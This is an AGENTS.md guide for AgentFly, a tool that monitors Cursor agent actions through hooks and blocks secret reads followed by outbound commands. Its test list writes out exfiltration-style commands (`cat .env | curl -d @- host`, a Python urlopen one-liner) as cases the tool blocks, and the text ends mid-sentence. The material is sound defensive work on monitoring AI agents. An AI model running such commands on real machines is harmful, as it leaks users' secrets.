# AGENTS.md — AgentFly

## What this project is
Cursor hooks send every agent action to a local server. The server decides
allow, warn or block using rules, and saves a cleaned copy to a local store
(Neo4j is an optional extra copy). A web page shows the session live. Read
`SPEC.md` first.

`SPEC.md` is the **v1 target**. The code is still the hackathon version and
moves toward it card by card. So:
- Inside your card, follow SPEC.md and the card.
- Outside your card, leave the code as it is and note the gap in your report.
- If SPEC.md and your card disagree, stop and ask. Do not silently pick one.

The hackathon spec is `docs/archive/SPEC-hackathon.md` (history only).

## Commands
- Install deps: `uv sync`
- Install for every project (one `sudo`; bundled Python and hook client in
  `/Library/Application Support/AgentFly/`, tagged entries in
  `/Library/Application Support/Cursor/hooks.json`): `agentfly init -g`. Remove it:
  `agentfly uninstall` (our entries first, then the folder). Quit and reopen Cursor after
  either: it reads the system file only at start-up. The installed client is a copy, so a
  hook client change needs `init -g` again.
- Run the recorder as a service (no `sudo`): `agentfly start` writes and loads
  `~/Library/LaunchAgents/dev.agentfly.recorder.plist` (`KeepAlive`; `brew services` inside a
  Homebrew keg) and waits for `/health`; `agentfly stop` unloads it and deletes the file;
  `agentfly status` says who runs it and what `/health` answers. `agentfly uninstall` removes it
  too. A dev checkout runs `uv run agentfly serve` instead; both on port 8787 do not work.
- Check an install: `agentfly doctor` (one line per check, exit 1 on any fail, no password).
- Dev-only wiring (writes gitignored `.cursor/hooks.json`): `./install.sh`. With `init -g`
  also installed, every event arrives twice.
- Clear saved history (not marks, not Neo4j): `agentfly wipe`. R0 denies it to the agent.
- Rules: `agentfly rules check [FILE]` and `agentfly rules test [FILE]` (no FILE: the file the
  recorder would load, the active `/Library/Application Support/AgentFly/rules.toml` if it exists,
  else `agentfly/rules/default.toml`). The recorder reads the active file once, at start, and only
  believes it if it is a plain file owned by root that group and others cannot write (D3); the
  active file is read that way by `doctor` and by these commands too, other files are drafts.
  `rules test` exits 1 for a file with no tests. A file must keep R1 at least as strong as the
  program's minimum (D27) and stay under the work limit (`rulefile.MAX_WORK`, 200 units: the packaged
  default uses 31; a name pattern is 1, a slash pattern 4 plus 12 per `**` plus 1 per part past the
  fourth).
  `init -g` writes the file when missing, replaces it when it is byte for byte a default the
  package once carried (D28; the hashes are `rulefile.SHIPPED_DEFAULTS`, the new one goes in
  whenever `default.toml` changes), and keeps an edited one; a recorder restart applies a change.
- Check (run before you report a step done): `uv run ruff check . && uv run ruff format --check . && env PYTHONDONTWRITEBYTECODE=1 uv run pytest -q -n auto --dist loadgroup`
  The tests run in parallel; the `env` keeps byte-code out (another worker's `.pyc` would
  break `test_nothing_is_written_next_to_the_client`). The flags stay on the command line,
  never in `addopts`: the live-Neo4j test starts its own `pytest`. CI runs this same line.
- Serial test run (one core, for a failure you cannot explain in parallel): `uv run pytest -q`
- Web check: `npm --prefix ui ci && npm --prefix ui run check`
- Stale-build check: `npm --prefix ui run build && test -z "$(git status --porcelain ui/dist)"`
- Auto-fix style: `uv run ruff check --fix . && uv run ruff format .`
- Run server: `uv run agentfly serve` (127.0.0.1 only; `--port N` or `AGENTFLY_PORT=N` for
  tests only: hooks always post to 8787, D25). A second `serve` on a busy port exits 1 and
  changes nothing.
- Build the wheel (carries `ui/dist`): `uv build`; try it with `uv tool install dist/*.whl`
- Replay a scripted session without Cursor: `uv run python fake_agent.py`
- UI dev server (proxies `/api` to the recorder): `npm --prefix ui run dev`

## Approved dependencies (no need to ask)
Python: fastapi, uvicorn, httpx, neo4j (driver), pytest, pytest-xdist (with its
`execnet`), ruff, and hatchling (build backend, D6). Standard-library
`tomllib`, `sqlite3` and `argparse` need no approval. The **bundled Python
runtime** (D5) is also approved: a relocatable standalone build (the kind uv
downloads) that `agentfly init -g` installs for the hook client; the packaging
card picks the exact build. Ask before adding anything else.

JavaScript (npm **only inside `ui/`**; commit `ui/dist`, ignore
`ui/node_modules` via `ui/.gitignore`): vite, react, react-dom, typescript,
tailwindcss, `@tailwindcss/vite`, vitest, `@vitejs/plugin-react`,
`@testing-library/react`, jsdom, `@types/node`, `@types/react`,
`@types/react-dom`, `@xyflow/react` and `motion` (the last two are pinned in
`ui/package.json`). The page at `/` is the Vite build in `ui/dist`.

CI: GitHub Actions, `.github/workflows/ci.yml` only, on a hosted macOS runner (owner
2026-10-19). Ask before adding an action or another workflow.

## Working rules
- One card at a time. Do only the card you were asked for, then STOP and say
  what works and what does not. Do not start the next card. The card says what
  you may touch.
- The block decision uses in-memory state only. It never waits for a database
  or the network. Writes to the local store (and to Neo4j, when enabled) happen
  in the background and must never slow or break a hook response.
- Do not guess how Cursor hooks behave. Log the real input first (with file
  contents thrown away), then code against what actually arrives. After the
  logging stage, paste the real fields into the "Hook facts" section below.
- The page is read-only and never queries a database. No Cypher or SQL from
  the web page. The server has a small fixed set of named read queries. Values
  are always parameters, never pasted into query text. Neo4j reads use a
  read-only transaction and a time limit.
- Every write to Neo4j is `MERGE` on `id` (step id = session id + order
  number). Re-running must not create duplicates. Never DELETE anything in
  Neo4j unless the user passes `--clear`. Create uniqueness constraints first.
  (Deleting from the local store is `agentfly wipe` and retention only.)
- Never store file contents, secret values, tool inputs, edit text or agent
  replies. Store what SPEC section 4 lists (including the workspace root path),
  cleaned by its command-cleaning rules. The full action lives only in memory
  while the decision is made.
- Never print request bodies in logs.
- Nothing on port 8787 may change a rule, allow an action once, reset a mark
  or delete data (SPEC section 11). A new route is a read-only GET and gets a
  line in the API whitelist test in the same change.
- Rule shape: `Rule(id, severity, message, check)`. `severity` is `block`,
  `warn` or `highlight`; the strictest firing rule wins and a tie goes to file order.
  `check` is a small named pure function `(action, session) -> bool`. A rule *kind*
  (`match`, `after_then`) is such a function in Python; the rules file (TOML) only
  supplies a kind's parameters and named lists. Do not build an expression language:
  a new kind is Python, a new rule is a file entry. R0 lives in code and no rules file
  can switch it off or name it. R1 and its sensitive-name lists are the first entry of
  `agentfly/rules/default.toml`; only its engine-only outbound cases stay in Python
  (`command_class = "outbound"`). `agentfly/recorder/rulefile.py` reads and checks the
  file (it never raises and reads no environment); `rules.py` composes the rules. Every reader of
  a rules file goes through `rulefile.load_bytes`, which also holds the program's minimum for R1
  (D27: an `after_then` block whose `after` marks every name SPEC §5 counts as secret on read and
  shell, with exceptions only SPEC §5's two (`.env…` ending `.example`/`.sample`/`.template`,
  `id_rsa…` ending `.pub`), and whose `then` is exactly outbound shell; widening and rewording are
  fine) and the work budget.
  `Session.marked` is R1's trigger; every other `after_then` rule's trigger is its id
  in `Session.triggers`. No flag or variable moves the active file or who must own it: tests set
  `rulefile.ACTIVE_RULES` and `rulefile.ACTIVE_OWNER_UID`.

## Hook client rules
(`agentfly/hook_client.py`, installed as `agentfly-hook`; `hooks/hook.py` is a shim for it
until V3. Called as `agentfly-hook <agent> <event>`; with no arguments it acts as `cursor`.
SPEC section 8.)
- Standard library only, one file. Run it with `python -I -S` on a Python
  directly (never `uv run`, which is slow to start). In v1 that is the bundled
  system-owned Python, not the project's virtualenv or `/usr/bin/python3`.
- Posts only to `127.0.0.1:8787` (D25): no port file, no environment override. Tests
  set the client's port inside the test harness. HTTP wait 0.5 s (V2b measured it;
  p95 69 ms with the recorder up, accepted until V3 re-measures). Set an explicit
  `timeout` in `hooks.json`, and quote the command path.
- Stdout must contain ONLY the JSON answer. Any other print to stdout can
  make Cursor block the action. All logging goes to stderr. Always print valid
  JSON and exit 0; never exit 2 by accident.
- If the server is unreachable or slow, apply the **offline guard** (D4, SPEC
  section 9), not a plain allow: deny outbound commands (except localhost and
  private ranges) and R0 guard-path commands, allow the rest, log the miss, and
  say "run `agentfly start`" in the deny message. Plain allow only after
  `agentfly uninstall` has removed the registration. A 401 or 403 from the
  recorder (wrong token) and input the client cannot parse get the same guard,
  never an allow. Every inline `python -c` / `node -e` is denied offline.
- Strip content before doing anything else: `content` of `beforeReadFile`,
  `edits` of `afterFileEdit`, `output` of `afterShellExecution`, and the
  contents of `tool_input` (keep only a file tool's target path, and an MCP
  call's server and tool names), and any nested `content` / `output` (for
  example `attachments[].content`). The hook log keeps no command text.
  Top-level fields such as `parent_tool_call_id` pass through (D21).
  Session events (`sessionStart`, `sessionEnd`, `subagentStart`) keep only ids and
  names; `subagentStart.task` (the subagent's prompt) never leaves the client.
- On deny, put the rule text in BOTH `user_message` and `agent_message`, and
  add to `agent_message`: "Do not retry with another tool or language. Stop
  and tell the user."
- Send the token header. The session key is `conversation_id` (confirmed).

## Secrets
- The repo's `.env` contains only a FAKE demo secret used as bait
  (`API_KEY=demo-not-a-real-secret-12345`). Never put a real credential in it.
- Real credentials (Neo4j URI, user, password) live in a file OUTSIDE the
  repo folder, read only by the server. Names are listed in `.env.example`.
  Never print, export or commit them. Never pass them to the hook client.
  That file is `~/.config/agentfly/neo4j.env` (mode 600, D7). The recorder's
  first start moves the hackathon `~/.config/flightrecorder/.env` there once.
- Command cleaning (`agentfly/recorder/clean.py`) is **on by default**. Set
  `CLEAN_COMMANDS=0` (or `false` / `off`) when starting the server to store
  raw commands instead — debugging only; secrets may then reach Neo4j.
- Local history: SQLite `~/.local/share/agentfly/history.db`, 28-day retention (D14).
- Neo4j (optional, off by default): runs only with `neo4j = true` in
  `~/.config/agentfly/config.toml`; `neo4j.env` alone does not turn it on. `uv run python -m agentfly.recorder.check_db` /
  `python -m agentfly.recorder.store --counts` / `--clear`. Writes are background-only;
  never DELETE except `--clear`. If `neo4j+s://` fails TLS verify on the host, use `neo4j+ssc://`
  (documented in `.env.example`); restart the server after editing creds.
- Tests never use that login. The live Neo4j tests run only when
  `AGENTFLY_TEST_NEO4J_ENV` names a separate credentials file for a test
  database, and skip otherwise; never point it at the owner's AuraDB.
- The page: `GET /` (and its assets under `/assets/`) and `GET /api/steps` are
  Host-only (no token). The page never talks to a database; the live trail reads
  process memory. See README / HOOKS for the JSON contract.

## Code style
- Python 3.12, type hints on function signatures, `pathlib`, small functions.
- Rule checks and the command cleaner are pure functions (data in, result
  out) so tests need no network, no Neo4j and no Cursor.
- Plain `print`/`logging`. No CLI-framework or progress-bar libraries (the v1
  CLI uses `argparse`, one module per command).

## Testing (tests/test_rules.py, tests/test_clean.py, tests/test_app.py, ...)
Only tests that exist are listed here. Each card adds its own tests and the
lines for them (R0 and normalisation: V5).
- `cat .env` marks the session; `curl https://x.com` afterwards is blocked.
- `curl` without a prior secret read is allowed.
- `.env.local` is sensitive; `.env.example` and `id_rsa.pub` are not.
- `grep KEY .env` and `source .env` mark the session.
- `cat .env | curl -d @- host` is blocked (marking happens before blocking).
- `curl localhost:8000/health` is allowed even after marking.
- `python3 -c "import urllib.request; urllib.request.urlopen('https://x.com')"`
  after marking is blocked (a one-liner mentioning http).
- A secret read in one session does not affect another session.
- Marks survive a server restart.
- Cleaner: `curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1`
  is saved as `curl -H <arg> x.com`; `API_KEY=abc make` is saved as
  `API_KEY=<removed> make`; an unsplittable command is saved as
  `<program> <unparsed>`. No secret survives in any shape (attached short
  options, long options, URL credentials, env-prefix and `export`):
  `mysql -pX db` is saved as `mysql -p<arg> <arg>`, and a flag cluster keeps only
  its first letter (`ls -la` is `ls -l<arg>`). `tests/leak_cases.py` lists them.
- Whitelist: the app serves only the `(method, path)` pairs in `ROUTE_WHITELIST`
  (`tests/test_app.py`); HEAD on an API route is 405; `/docs`, `/redoc` and
  `/openapi.json` are 404.
- Paths: the first start moves `~/.config/flightrecorder` once (`tests/test_paths.py`);
  every test runs under a temporary HOME (`tests/conftest.py`).
- Hook client (`tests/test_hook_client.py`, `tests/client_harness.py`): fuzzed stdin
  (surrogates, non-UTF-8, 5000-digit numbers, deep nesting, random bytes) always gives
  one JSON object and exit 0; planted markers in content, edits, output, nested
  fields and `tool_input` never reach the log, stderr or the request body;
  `parent_tool_call_id` arrives; an unknown agent gets allow and a stderr warning.
- Offline guard (`tests/test_offline_guard.py`): with no recorder, a slow one, or
  401/403, outbound commands (bare and wrapped in `bash -c`, `env`, `sudo`), every
  one-liner and guard-path commands are denied with "agentfly start"; `ls`,
  `curl localhost:8000/health` and private addresses are allowed.
- Serve (`tests/test_serve_port.py`): a second `serve` on a busy port exits 1, the
  token is unchanged and the first recorder still blocks R1. Docs
  (`tests/test_install_docs.py`): `install.sh` creates no `~/.config/flightrecorder`;
  README and HOOKS.md name `/` as the trail.
- Package: `tests/test_package.py` builds the wheel, installs it with `uv tool`
  under a temporary HOME and runs `agentfly serve` and `agentfly-hook`. From the wheel it also:
  checks and tests the default rules the wheel carries (`rules check` / `rules test` on that file);
  replays the demo with byte-identical answers (R1 comes from the file inside the wheel); lists
  `R0, R1, npm-publish-after-env` at `/api/rules` with no `rules_problem`; and shows that the
  wheel's RECORD lists `agentfly/rules/default.toml` with the hash `init -g` checks it against.
- Graph API: `GET /api/steps` without token → 200; wrong Host → 403; after
  README → `.env` → curl ntfy, payload has sensitive `.env` and blocked R1;
  `?all=1` returns more than the default last 10; `GET /` serves the React
  page and its `/assets/` load; wrong Host on `/` (and `/v2`) → 403; `/` and its assets send
  `Cache-Control: no-cache`; `/v2/` (also `/v2`, `/v2/index.html`) answers 307 to
  `/` with the query kept; missing `ui/dist` logs a warning and does not
  prevent the app from importing.
- Normaliser and R0 (`tests/test_normalize.py`, `tests/cases.py`, `tests/test_r0.py`):
  wrappers, substitutions, heredocs and one-liners; guard paths and R0 commands denied
  unmarked, bare, wrapped and unparseable. Subagent mark (`tests/test_subagent_mark.py`):
  parent link in either order, restart, 30-minute workspace fallback.
- History (`tests/test_localstore.py`, `tests/test_sessions_api.py`, `tests/test_wipe.py`):
  `/api/sessions` after a replay and restart; only SPEC §4 columns; retention; `wipe` keeps
  marks and links; Neo4j off without `neo4j = true`; a session event still links a subagent.
- History marks (`tests/test_history_mark.py`, V6b): the marked flag and the marking step
  (`marked_order`) equal `/api/steps` for `cat .env`, a `.env` read, a lone Write and a read of
  `.env.example`; a Read+Write of `.env` with one id (and the id-less `afterFileEdit` that ends
  it) marks, also after a restart; a subagent, a parent marked through its subagent (links in
  either order, nested) and a chat in the 30-minute fallback are marked with no marking step
  (a fallback chat that marks itself after the window ended names that step, as `/api/steps`
  does), another workspace is not; a `history.db` from before V6b opens with every row, the same marked
  flags and the first read answering 200; a failed upgrade rolls back; a flagging failure changes
  no hook answer.
- Step merge (`tests/test_step_merge.py`, `tests/fixtures/v2c_capture.json`): a shell, read
  or MCP pair with one `tool_use_id` is one step on the page, in history and in Neo4j's
  queue; the id-less fallback (0.3 s joins; 6 s, another path or another chat do not; the
  33rd waiting Read drops the oldest); strictest gate verdict; `afterFileEdit` never raises
  it; hook answers byte-identical with and without the merge; the capture replays as five
  steps. `tests/test_memory.py` covers `replace`.
- Step fields and health (`tests/test_step_fields.py`, V8b): after the `demo/scenario.json` replay
  the blocked step has `rule_text` (R1's message) and `user_message` / `agent_message` equal to
  the deny answer's, and the allowed steps have none of the three; a warned step on a shell
  command (answer `ask`) carries the answer's messages, a warned step on another event has
  `rule_text` and no messages (its answer is a plain allow); a merged
  pair shows the messages of the half whose verdict it shows, the earlier half on a tie (R0 against
  R1, either order); `/health` sends `last_hook_at` (`null` after start, UTC ms, set by a request
  that passed the token check, not by a 401); `?all=1` sends `marked_order` as `?limit=1` does. The
  messages reach neither `history.db` nor Neo4j (`tests/test_localstore.py`, `tests/test_store.py`,
  marker strings), and the deny answer's bytes are pinned.
- Rules file (`tests/test_rulefile.py`, `tests/test_rules_load.py`, `tests/test_rules_cli.py`,
  `tests/test_rules_api.py`, V5b): R1's name lists answer as the old `is_sensitive` did over about
  6,000 generated names; every kind of fault is refused with a message naming the rule (and
  `tomllib` oddities such as deep nesting never crash); the recorder runs the default when the
  active file is missing or invalid and says why in `/health` (`rules_problem`, only then) and
  `GET /api/rules`; a damaged packaged default leaves only R0, does not stop `uninstall` from
  importing and stops the recorder from starting (with a refused active file too, and then the
  reason says the default is damaged, not in force); `rules check` / `rules test` exit 1 and name the
  rule. Tests never read the real rules file: the conftest redirects `rulefile.ACTIVE_RULES` and
  sets `rulefile.ACTIVE_OWNER_UID` to the test's own user (and the umask to 022), and
  `RECORDER_CODE` does both in a child recorder. A path pattern with a `*` or a `[...]` and no
  character a name must contain (`[!x]*`, `*[a-z]*`) is refused as matching every path. A
  floating pattern (V5b-fix2: a run of parts with `**` on both sides) in any rule's `path_except`
  (`.ssh/**`, `a/**/b`, `**/x/**`, in a `match` rule and in an `after_then`'s `after`) is refused
  with a message naming the rule; `~/.ssh/**` and a name load. `rules check` loads a file whose
  `path` holds a floating pattern and prints one `warn:` line for it, and one for a command list
  whose heaviest bucket weighs over 20, once per list per rule (eleven entries `cat a0 bJ` weigh
  22 and give a line, ten weigh 20 and give none; the packaged default has no lint at all)
  (`tests/test_rulefile.py`, `tests/test_rules_cli.py`).
- Trusted file (`tests/test_rules_trust.py`, V5b-fix): a link (also a dangling one), a file that is
  not the owner's, one group or others can write, a named pipe and a folder are each refused: the
  default runs and `/health`, `/api/rules`, `doctor`, `agentfly start` / `status` (as one line) and
  `rules check` / `rules test` with no FILE say why; the reason line is at most 400 characters and
  always ends with what runs instead; `rules check FILE` is a draft check unless FILE is the
  active file; a child recorder says it over HTTP; a fresh process shows the owner is root.
  V5b-fix2: `rulefile.trust_problem` is the recorder's trust test alone (the same open, the same
  wording for each kind above, no read, no descriptor left open; none for modes 0644, 0640, 0600
  and 0444); `rules check LINK` and `rules test LINK`, where LINK points at the active file, judge
  the active file and name its path, not the link (a group-writable one is refused as that);
  `rules check` calls the active path "the active file" given itself or through a link.
- R1 minimum (`tests/test_rules_minimum.py`, D27): the packaged default passes; about thirty
  weakened files (R1 missing, as a match, warn or highlight, `after` on one event, `then` with a
  condition, lists that miss names, exceptions for a literal name, a file type or a folder) are
  each valid TOML refused with an error that starts `rule R1`, by `rules check` (exit 1) and by the
  recorder (the default runs); `.env*` for `.env` and `.env.*`, extra names, no exceptions, a
  reworded message and extra rules load; another rule's error does not hide R1's (also one whose
  id starts like it, `R10` or `R1x`), a broken R1 is
  not also "missing" (also when the fault is in its `after`, its `then` or an inline test). The
  check does not read `default.toml`.
  V5b-fix2 (`tests/test_rules_minimum.py`, `tests/r1_grid.py`): the names are judged by the shape
  of R1's patterns, not on sample names. SPEC §5's six bullets are one table
  (`rulefile.SECRET_FAMILIES`, which `spec_secret` also reads and which answers as the old
  function did on the grid and 20,000 random names); `rulefile.covers` says a pattern covers a
  bullet when it has no `/`, `?` or `[`, at most one `*`, and is the bullet's one name or `P*Q`
  with P a prefix of its fixed start and Q a suffix of its fixed end (`.env`: no more than 4
  characters in all); exceptions are judged by their own shape, not by the coverage rule. The
  brief's three dodge files (a chain of `.env.[!s]*`, `credentials[!$ ]*`, `.env.` plus fifteen
  `?`) are each refused by `rules check` (exit 1) with `rule R1: ` and the bullet; `.env*`, `.*`,
  `*pem`, extra names and `~/.ssh/**` load. R1 with a floating folder pattern (`.ssh/**`,
  `a/**/b`, `**/x/**`) is refused naming R1 and the recorder runs the default, while
  `~/.aws/config`, `~/.aws/**` and `/etc/ssl/private/*` load; the packaged R1 never charges the
  meter. `tests/r1_grid.py` keeps the old sample grid (SPEC's names in the shapes a list gets
  wrong, in several places and as a shell word) as a second opinion: every accepted fixture
  leaves no grid name unmarked. The brute force (seed 27) draws a thousand R1 name lists from
  one covering shape per family, some swapped for one- or two-character edits of it or for a
  fixed near miss (`.env.?*`, `.env*.env`, `.en*nv`) and some such added; for each list the file
  accepts, every secret name built from a family's start, a middle of up to two characters and
  its end (and each exempt ending) is marked, read and shell; at least 100 lists are accepted
  and 100 refused (399 and 601 here).
- Cost (`tests/test_rules_cost.py`, V5b-fix, V5b-fix2): what is worked out about a word is worked
  out once (memo hit counts); the weights of `rulefile.pattern_work`; a file at the limit of each
  shape is accepted and one unit over is refused naming the heaviest rule; a command entry is
  looked up in a table made once per command. The work has two bounds, both counted, and each
  test fails if its bound is taken away. A pattern that does not float makes at most `MAX_WORK`
  times the command's distinct candidates (`rulefile.distinct_candidates`) pattern tests per hook,
  also at 60 folders deep and on a partly parsed command, and never charges the meter (eight
  shapes at the limit, among them anchored and tail-only slash patterns and the reviewer's two
  files; the shapes that float are listed apart and a test says they float). A floating pattern
  (the reviewer's block rule `d*/d*/d*/zN/**` five times is in `SHAPES`) stops at `FLOAT_STEPS`
  plus one block's walk: through `Recorder.run` the hook answers the limit deny, the real steps
  (`fnmatch.fnmatchcase` calls on the heavy parts plus the starts and bare `*` parts seen at
  `_tally`) number 45,004 here, and with `_charge` a no-op it answers allow after 306,000. A walk
  stops once it has spent what the meter had left when it began: one `.ssh/**` on a path 50,000
  folders deep ends at most one start's work below 0 (final audit A1).
  The price of a long compare and of a bare `*` is pinned. The whole hook (`apply_rules`, 300
  words, paths 20 folders deep, `=` and `@` in the words; also 198 rules whose command lists all
  name the program in the command) is under the client's own 0.5 s wait (`@wallclock`, best of
  three; well under it here, so a loaded machine passes). No other test bounds seconds.
- Matcher (`tests/test_rules_matcher.py`, `tests/glob_oracle.py`, V5b-fix2): a slash pattern is
  split at each `**` into a head, a tail and middle blocks, and only a pattern with a middle block
  floats (`rulefile.floating`); the old walk is kept in `tests/glob_oracle.py`, and the new
  matcher answers as it did on 20,000 seeded random patterns and paths (anchored or not, leading,
  trailing and inner `**`, `*`, `?`, classes) and, through `Pattern.matches`, on `~/`, `/`, `..`,
  `//` and mixed case (5,000 random compiled slash patterns too); a pattern that does not float
  makes at most one `fnmatch` compare a part at depths 4, 20 and 60, and a bare `*` none; the
  tail is checked before a middle block and the head before the tail; middle blocks keep their
  order and do not overlap; the home folder is looked up once for a clause.
- Meter and command index (`tests/test_rules_meter.py`, V5b-fix2): patterns that do not float
  never charge (a meter's budget is the same after a 300-word command under the default, the
  reviewer's two files and a 167-name list); a floating pattern charges `1 + n * m // 256` for an
  `fnmatch` compare (`DIV`), and 1 for a start and for a bare `*`; past the budget `WorkLimit` is
  raised and every later charge raises, and one walk stops at the budget however deep the path;
  with no meter nothing is charged; a partly parsed command
  is walked once per distinct candidate. The command index (a list is looked up by program, then
  by the entry's rarest extra word) answers as the old loop on 3,000 seeded cases; a command
  naming 200 listed programs makes at most 201 key look-ups; 198 rules of 200 `cat` entries on
  150 `cat zN y` check no entry; a simple command is read once for all clauses of a hook.
- Command lists count against the rules limit (`tests/test_rules_meter.py`,
  `tests/test_rules_limit.py`, `tests/test_rules_cli.py`; owner 2026-10-21): a bucket of the index
  is charged its weight (1 plus the words of each rest) before its first entry is read (ten
  one-word rests weigh 20, and a meter of 19 reads none), and key probes cost a step for four
  (8 probes charge 2; fewer than 4 make no charge, even on a spent meter). The bipartite shape
  (198 block rules, each a list `cat aI bJ`, I below 20, J below 10, on 13 `;`-joined
  `cat a0 .. a19 zK`) gives the limit deny, and the entry work counted at `_entry_follows` and
  `_key_lookups` is at most `FLOAT_STEPS` plus one bucket (with `_charge` a no-op more than
  `FLOAT_STEPS` entries are read); as warn it answers `ask` with the limit message, as highlight
  allow with the rules in `meter.unfinished`; R0 and R1 answer as usual with those 198 rules
  before R1. Real shapes are never charged (the default on `command(60)`; 198 times `cat wN` on
  150 `cat zN y`; 198 times `cat w a0..a199` on 100 `cat w x`; 20 block rules of 15 entries like
  `git push --force` on 75 `git push origin bK`), while 198 times `cat wN` on `command(60)` pays
  only its probes (198 times 50 steps) and finishes. `rules check` prints one line for a heavy
  list, none at weight 20 (see Rules file above).
- Limit (`tests/test_rules_limit.py`, V5b-fix2): one hook shares one budget (`rules.one_hook()`
  reads `rulefile.FLOAT_STEPS` at each call); an unfinished block rule gives the `rules limit`
  deny, the limit message in both fields, unless R0 or R1 answers; R0's and R1's answers are the
  same at the limit, also with the heavy rule placed before R1, and R1's mark is still set. An
  unfinished warn on a shell command answers `ask` with the limit message, on any other event a
  plain allow whose step shows `rules limit`; an unfinished highlight is skipped; an unfinished
  trigger is recorded in no chat and no parent, and a restart judges the next command as if the
  hook had not happened; a fired block before an unfinished one wins and one after it does not.
  Outside a hook nothing is charged. A 167-name list on 300 words of 30-character names gets no
  limit deny. `/health` has `rules_limit` only after a hit (a fresh start has the three keys
  again); the line is cut to 400 characters with "and K more"; the log line names the chat and
  the rule ids and holds no command text (and at most 80 characters of the chat id); a merged
  pair with a limit half shows the limit rule; the limit message says `rules check` may name the
  heavy rules. A trigger a chat holds only through the workspace fallback is evaluated again by
  `mark`; a heavy command that leaves it unfinished and also performs the trigger action gets the
  limit deny and nothing is recorded for that chat (it fails closed).
- Long words (`tests/test_long_words.py`, V5b-fix2): a quoted word of 300 or 5,000 characters
  (with and without `/`), 128 emoji, a program name as long and a Read `file_path` with a part
  over the system's name limit each get the answer the short word gets, R1 still blocks after a
  `.env` read, and the step reaches the history cleaned; the cleaner asks the system about no
  word over 1,024 characters; the root itself is `.`, and `ws2` beside `ws` is outside it; a
  lone surrogate or NUL makes a word not a path, an absolute path the system cannot encode (also
  one macOS resolves, U+DC80..U+DCFF) is saved as its base name, and a base name that does not
  encode is saved with U+FFFD for each lone surrogate, so a Read of `<ws>/x/\udcff` reaches the
  history and `/api/steps` answers 200; a 60 kB program word naming a secret is not looked up;
  a link loop never raises (shell word, Read and Write answer allow
  and reach the history); `bash -c` with 300 paths 60 deep is cleaned as one word and is under
  the client's wait (`@wallclock`). `tests/leak_cases.py` and `tests/test_clean.py` pass unedited.
- Shipped defaults (`tests/test_rules_shipped.py`, D28): `SHIPPED_DEFAULTS` ends with the hash of
  `default.toml`, has no duplicates, and equals the hashes of the earlier files kept in
  `tests/fixtures/shipped_defaults/` plus the current one; every earlier file still loads.
- Severities and triggers (`tests/test_severities.py`, `tests/test_after_then.py`,
  `tests/test_session_triggers.py`, `tests/test_npm_publish_entry.py`): the strictest rule wins in
  every file order; a warn on a shell command answers `ask` with the text in both messages, a warn
  elsewhere and every highlight answer `{"permission":"allow"}` (bytes pinned); the page and the
  history show warned and highlighted steps; a trigger survives a restart, reaches subagents and
  parents, is inherited for 30 minutes through the workspace fallback, never marks R1, and counts
  before the check on the same command; `npm publish` after `cat .env` is denied, in a fresh chat
  it is not.
- Install (`tests/test_install_*.py`): hooks.json splice keeps other tools' entries
  byte-identical (fuzzed), pinned Python checksum, exact Cursor version list, install,
  repair and uninstall on a temporary root, the sudo command line. The rules file
  (`tests/test_install_rules.py`) is written when missing, mode 644, from the packaged default as
  read once, compared with the wheel's RECORD hash (the fake tool environment lists it) and parsed
  under the recorder's checks; an unedited earlier default (each fixture) is replaced and the
  message asks for a recorder restart; an edited file, valid or not, is kept with one notice line;
  a default changed after the check, one that does not parse or is weak, or one RECORD does not
  list stops the install before anything is written; a link or folder in its place is refused
  before any repair, and in the unprivileged run before the password (`tests/test_install_cli.py`);
  `uninstall` removes the file with the folder.
  V5b-fix2 (`tests/test_install_rules.py`, `tests/test_install_cli.py`,
  `tests/test_rules_trust.py`): the principle is that `init -g` writes only bytes it has checked
  and never changes the trust of bytes it has not. Current bytes in a file that is not exactly
  a regular file of the layout's owner at mode 0644 (`rules_state` `untrusted`: another owner,
  mode 0664, mode 0600) are rewritten, the message names the reason and asks for a recorder
  restart, and `status` counts it as work; this is stricter than the recorder, which loads a
  root:admin 0640 file, so `doctor` may call fine a file `init -g` rewrites. A file an
  unprivileged run cannot read is `unknown`, not `edited`, and root decides after the password.
  An edited file is never written, chowned or chmodded: a trusted one gets the existing notice,
  an untrusted one "kept your edited rules file ..., but the recorder will not read it: <reason>;
  <what runs instead>", the reason being the recorder's own wording (`rulefile.trust_problem`).
  An intact re-run prints the pinned "already installed and intact; nothing changed" and then
  the notice, as the user with no password; with other repair work a group-writable edit stops
  the repair (`assert_locked` fails closed) and the file is not touched. As the user, `init -g`
  checks the packaged default before the password when it would write one (a damaged one stops
  with no prompt, and an edited file that means none is written does not need it); a refresh of
  the rules alone asks for a recorder restart and not a Cursor restart, one that changes more
  still asks for both.
- Escaped names (`tests/test_install_packages.py`, `tests/test_install_cli.py`,
  `tests/test_doctor.py`, F13): every text the package check shows the owner (the refusal, the
  confirm question, `doctor`'s package line, `tool_environment`'s messages) writes each character
  `str.isprintable` calls false as an escape (`\x1b`, `\n`, `\u202e`; `packages.visible`) and
  leaves other text alone, `café.py` and a backslash included. `inspect` escapes `Check.problems`
  and `Check.changes` when it builds them and `confirm` escapes what it prints; the hash record
  keeps names as read. Tests plant `ESC [2K`, a newline or U+202E in an unlisted file, a listed
  file that fails its hash or cannot be read, a RECORD row outside the environment, a dist-info
  folder, the environment path and a `METADATA` Name or Version (a newline there is a folded
  header: a plain one ends it); `init -g` and `uninstall` stop with one printable line and no
  password, nothing raw reaches stdout before "Go on? [y/N]", `doctor` prints one plain line.
  Expected texts are written out, never computed with `visible`.
- Service (`tests/test_service.py`, stubs in `tests/launchctl_stub.py`, `tests/brew_stub.py`,
  `tests/service_helpers.py`): `start` writes the KeepAlive plist and loads it, does nothing when
  it runs, reloads a changed file, waits for launchd's teardown; `stop` leaves no job and no file;
  a Homebrew keg with a stub `brew` runs `brew services`, writes no LaunchAgent and removes the
  one an earlier install left; `uninstall` removes the service and, when its system part fails,
  says only that and leaves the service alone (`tests/test_install_cli.py`). An autouse fixture
  in `tests/conftest.py` gives every test a stub `launchctl` and a closed health port, so no test
  reaches the real launchd or port 8787. The service labels are guard paths for R0 and the
  offline guard (`tests/cases.py`), and `_R0_PATHS` must equal `_GUARD_PATHS`
  (`tests/test_r0.py`).
- Doctor (`tests/test_doctor.py`): a clean install is all ok; each listed fault turns only its
  own line to fail; a warning alone exits 0; `path` compares environments (two venvs on one base
  Python are two programs), and a loaded LaunchAgent next to Homebrew's job fails `service`; the
  Hooks log is matched on the lines Cursor 3.25.9 wrote (the wording of an error about the system
  file itself has not been seen). The `rules` line warns on a missing rules file and on an
  unedited older default (`init -g` refreshes it), fails on a file the recorder would refuse (a
